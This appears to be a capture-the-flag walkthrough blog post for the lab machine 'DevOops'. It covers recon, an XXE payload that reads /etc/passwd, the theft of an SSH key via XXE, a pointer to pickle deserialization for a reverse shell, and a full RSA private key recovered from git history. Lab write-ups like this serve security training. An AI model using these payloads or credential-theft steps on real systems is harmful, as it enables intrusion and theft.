@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>DevOops - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">DevOops</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1729106942196"
+                  >2024-10-16 21:29</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1729174829626"
+                  >2024-10-17 16:20</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>$nmap -p- -<span class="hljs-keyword">A</span> <span class="hljs-number">10.129.164.53</span>
+PORT     STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">4</span> (Ubuntu Linux<span class="hljs-comment">; protocol 2.0)</span>
+| ssh-hostkey: 
+|   <span class="hljs-number">2048 42:90</span>:<span class="hljs-number">e3:35:31:8d:8b:86:17:2a</span>:fb:<span class="hljs-number">38</span>:<span class="hljs-number">90</span>:da:c4:<span class="hljs-number">95</span> (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-number">b7:b6:dc:c4:4c:87:9b:75</span>:<span class="hljs-number">2a:00:89:83:ed:b2:80:31</span> (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">d5:2f:19:53:b2:8e:3a:4b</span>:<span class="hljs-number">b3:dd:3c:1f:c0:37:0d:00</span> (ED25519)
+<span class="hljs-number">5000</span>/tcp open  http    Gunicorn <span class="hljs-number">19</span>.<span class="hljs-number">7</span>.<span class="hljs-number">1</span>
+|_http-title: Site doesn't have a title (text/html<span class="hljs-comment">; charset=utf-8).</span>
+|_http-server-header: gunicorn/<span class="hljs-number">19</span>.<span class="hljs-number">7</span>.<span class="hljs-number">1</span>
+Service Info: OS: Linux<span class="hljs-comment">; CPE: cpe:/o:linux:linux_kernel</span></code></pre></div>
+<p>Going to port 5000, get’s s a nice site <em>under construction!</em>.</p>
+<p><img src="/_resources/697df615077541468819ae930667c59b.png" /></p>
+<p>Running dirsearch finds us <code>/feed</code> and <code>/upload</code>.</p>
+<div><pre class="hljs"><code>Target: http:<span class="hljs-comment">//10.129.164.53:5000/</span>
+<span class="hljs-string">
+[19:31:38]</span> Starting: 
+<span class="hljs-string">[19:32:05]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">533</span>KB - /feed
+<span class="hljs-string">[19:32:27]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">347</span>B  - /upload</code></pre></div>
+<p>As one could expect, <code>/upload</code> will be our primary target.</p>
+<p><img src="/_resources/964e01640f464432a5831522c988d6d5.png" /></p>
+<p>Uploading my sample xml file, causes the server to crash.</p>
+<p><img src="/_resources/d8f16d4b89ac4be4ada0e6d85db9f69e.png" /></p>
+<p>Creating xml as mentioned by the site, returns some kind of blogpost processing response.</p>
+<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">Document</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span>John Doe<span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Subject</span>&gt;</span>XML Tutorial<span class="hljs-tag">&lt;/<span class="hljs-name">Subject</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Content</span>&gt;</span>
+        XML (Extensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.
+    <span class="hljs-tag">&lt;/<span class="hljs-name">Content</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">Document</span>&gt;</span></code></pre></div>
+<p><img src="/_resources/4ed067f4db744e32a12b3a89367b50e6.png" /></p>
+<p>Going to <code>http://10.129.164.53:5000/uploads/sample-xml-files-sample-4.xml</code> does indeed work.</p>
+<p><img src="/_resources/6af9bb67a26048cbac09df93d261fe70.png" /></p>
+<p>We also learn that the files are stored under <code> /home/roosa/deploy/src</code> and now know the name of our victim user <code>roosa</code>. For a recap on testing xml files, checkout <a title="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">hacktricks</a>, as this is where I got my code from. Let’s test if ENTITY declaration is working.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">toreplace</span> <span class="hljs-string">"3"</span>&gt;</span> ]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Document</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span>John Doe<span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Subject</span>&gt;</span>XML Tutorial<span class="hljs-tag">&lt;/<span class="hljs-name">Subject</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Content</span>&gt;</span>
+        XML (Extensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.
+    <span class="hljs-tag">&lt;/<span class="hljs-name">Content</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">Document</span>&gt;</span></code></pre></div>
+<p>Testing further, let’s see if we can see file contents.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> 
+[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">example</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"/etc/passwd"</span>&gt;</span> 
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Document</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Author</span>&gt;</span><span class="hljs-symbol">&amp;example;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Author</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Subject</span>&gt;</span>XML Tutorial<span class="hljs-tag">&lt;/<span class="hljs-name">Subject</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Content</span>&gt;</span>
+        XML (Extensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.
+    <span class="hljs-tag">&lt;/<span class="hljs-name">Content</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">Document</span>&gt;</span></code></pre></div>
+<p>It works!</p>
+<p><img src="/_resources/d13d94963d8d4a9b91c431289c0693fc.png" /></p>
+<p>There are two ways of moving forward. One, just grabbing the id_rsa (<code>/home/roosa/.ssh/id_rsa</code>) of user roosa, that we found earlier. Remember to <code>chmod 600</code> and we are in.</p>
+<p>Second option is to try to abuse <code>feed.py</code>.</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">uploaded_file</span>(<span class="hljs-params">filename</span>):
+    <span class="hljs-keyword">return</span> send_from_directory(Config.UPLOAD_FOLDER, filename)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/"</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">xss</span>():
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/feed"</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">fakefeed</span>():
+    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">"."</span>, <span class="hljs-string">"devsolita-snapshot.png"</span>)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/newpost"</span>, methods=[<span class="hljs-string">"POST"</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">newpost</span>():
+    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Proper save to database, this is for testing purposes right now</span>
+    picklestr = base64.urlsafe_b64decode(request.data)
+    
+    <span class="hljs-comment"># Deserialize the pickled object</span>
+    postObj = pickle.loads(picklestr)
+    
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"POST RECEIVED: "</span> + postObj[<span class="hljs-string">'Subject'</span>]
+
+<span class="hljs-comment">## <span class="hljs-doctag">TODO:</span> VERY important! DISABLED THIS IN PRODUCTION</span>
+<span class="hljs-comment"># app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')</span>
+
+<span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Replace run-gunicorn.sh with real Linux service script</span>
+<span class="hljs-comment"># app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, debug=<span class="hljs-literal">True</span>)</code></pre></div>
+<p>We can do a post to <code>/newpost</code> and get a reverse shell. Abusing pickle is nicely explained in <a title="https://davidhamann.de/2020/04/05/exploiting-python-pickle/" href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">this blogpost</a>.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>In our home folder we have a couple of non-standard things.</p>
+<p>run-blogfeed.sh</p>
+<div><pre class="hljs"><code><span class="hljs-comment">#/bin/bash</span>
+
+<span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> replace with better script and run as blogfeed user which is restricted</span>
+
+<span class="hljs-built_in">cd</span> /home/roosa/work/blogfeed/src
+../run-gunicorn.sh</code></pre></div>
+<p>run-gunicorn.sh:</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/sh</span>
+
+<span class="hljs-built_in">export</span> FLASK_APP=feed.py
+<span class="hljs-built_in">export</span> WERKZEUG_DEBUG_PIN=151237652
+gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app</code></pre></div>
+<p>There is also <code>/deploy</code> and <code>/work</code>. They both have run-gunicorn script, but <code>/work</code> has also <code>authcredentials.key</code>.</p>
+<div><pre class="hljs"><code>~<span class="hljs-regexp">/work/</span>blogfeed<span class="hljs-regexp">/resources/i</span>ntegration$ cat authcredentials.key 
+-----<span class="hljs-keyword">BEGIN</span> RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+<span class="hljs-number">23</span>g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
+sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
+ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
+ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
+LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
+JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/<span class="hljs-number">2</span>KppubiHDi9
+oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
+xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
+vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+<span class="hljs-number">0</span>nbfjYX8x
+<span class="hljs-number">6</span>umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
+OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+<span class="hljs-number">6</span>pfyh3H5SuLhu9PPA36MjRyE
+<span class="hljs-number">4</span>+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
+<span class="hljs-number">937</span>GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
+SQMoKu++K1nbly2YS+mv4bOanSFdc6bT<span class="hljs-regexp">/SAHKdImo8buqM0IhrYTNvArN/</span>Puv4VT
+Nszh8L9BDEc<span class="hljs-regexp">/DOQQQzsKiwIHab/</span>rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
+eGDe3y<span class="hljs-regexp">/cPfWoEs9/</span>AptjiaD03UJi9KPLegaKDZkBG<span class="hljs-regexp">/mjFqFFmV/</span>vfAhyecOdmaAd
+i<span class="hljs-regexp">/Mywc/</span>vzgLjCyBUvxEhazBF4FB8<span class="hljs-regexp">/CuVUtnvAWxgJpgT/</span><span class="hljs-number">1</span>vIi1M4cFpkys8CRDVP
+<span class="hljs-number">6</span>TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
+<span class="hljs-number">8</span>rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+<span class="hljs-number">03</span>W8ejrla7Y8ZNsWWnsCWYgV
+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+T3Sd/<span class="hljs-number">6</span>nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+-----<span class="hljs-keyword">END</span> RSA PRIVATE KEY-----</code></pre></div>
+<p>That is definetly interesting, I tried to ssh as root into the server, but no shot. Exploring <code>/work</code> further, I found that it has git in it.</p>
+<div><pre class="hljs"><code>~/work/blogfeed$ ls -la
+total 32
+drwxrwx---<span class="hljs-number"> 5 </span>roosa roosa<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 17 </span>09:51 .
+drwxrwxr-x<span class="hljs-number"> 3 </span>roosa roosa<span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 26 </span><span class="hljs-number"> 2021 </span>..
+-rw-rw-r--<span class="hljs-number"> 1 </span>roosa roosa   <span class="hljs-number"> 0 </span>Oct<span class="hljs-number"> 17 </span>09:51 access.log
+-rw-rw-r--<span class="hljs-number"> 1 </span>roosa roosa<span class="hljs-number"> 3869 </span>Oct<span class="hljs-number"> 17 </span>09:51 feed.log
+drwxrwx---<span class="hljs-number"> 8 </span>roosa roosa<span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 26 </span><span class="hljs-number"> 2021 </span>.git
+-rw-rw----<span class="hljs-number"> 1 </span>roosa roosa <span class="hljs-number"> 104 </span>Mar<span class="hljs-number"> 19 </span><span class="hljs-number"> 2018 </span>README.md
+drwxrwx---<span class="hljs-number"> 3 </span>roosa roosa<span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 26 </span><span class="hljs-number"> 2021 </span>resources
+-rwxrw-r--<span class="hljs-number"> 1 </span>roosa roosa <span class="hljs-number"> 180 </span>Mar<span class="hljs-number"> 21 </span><span class="hljs-number"> 2018 </span>run-gunicorn.sh
+drwxrwx---<span class="hljs-number"> 2 </span>roosa roosa<span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 26 </span><span class="hljs-number"> 2021 </span>src</code></pre></div>
+<p>Checking the commits get’s us explanation, why our ssh key didn’t work.</p>
+<div><pre class="hljs"><code>roosa<span class="hljs-variable">@devoops</span>:<span class="hljs-operator">~</span><span class="hljs-operator">/</span>work<span class="hljs-operator">/</span>blogfeed$ git log <span class="hljs-comment">--name-only --oneline</span>
+<span class="hljs-operator">&lt;</span>SNIP<span class="hljs-operator">&gt;</span>
+<span class="hljs-number">33e87</span>c3 reverted accidental <span class="hljs-keyword">commit</span> <span class="hljs-keyword">with</span> proper key
+resources<span class="hljs-operator">/</span>integration<span class="hljs-operator">/</span>authcredentials.key
+d387abf <span class="hljs-keyword">add</span> key <span class="hljs-keyword">for</span> feed integration <span class="hljs-keyword">from</span> tnerprise backend
+resources<span class="hljs-operator">/</span>integration<span class="hljs-operator">/</span>authcredentials.key
+<span class="hljs-number">1422e5</span>a <span class="hljs-keyword">Initial</span> <span class="hljs-keyword">commit</span>
+README.md</code></pre></div>
+<p><img src="/_resources/136406da80434fb890851878974320a1.png" /></p>
+<p>Logging in with newly obtained ssh key works. Cool box.</p>
+<p><img src="/_resources/52d19bc90d7e40ff8c57c8b8952c4a97.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
